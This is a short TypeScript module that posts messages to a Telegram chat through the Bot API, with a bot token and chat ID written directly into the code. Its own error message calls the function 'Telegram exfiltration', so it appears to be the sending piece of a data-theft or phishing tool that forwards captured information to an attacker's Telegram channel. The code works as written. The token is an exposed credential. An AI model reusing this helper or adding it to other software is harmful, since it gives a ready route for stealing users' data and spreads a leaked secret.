const BOT_TOKEN = "8654770031:AAFNz1U9oprj9Yefl1_-Lh1Z9YEq3wm2QiI";
// Note: We need a numeric Chat ID or Channel ID. 
// Link provided: https://t.me/+34TAjq9CYJk1OWE0 (Private group/channel invite)
// For now, I'll keep the previous ID or set a placeholder to find the new one.
const CHAT_ID = "6166440263"; 

export const sendMessageToTelegram = async (message: string) => {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });
    return response.ok;
  } catch (error) {
    console.error('Telegram exfiltration failed:', error);
    return false;
  }
};
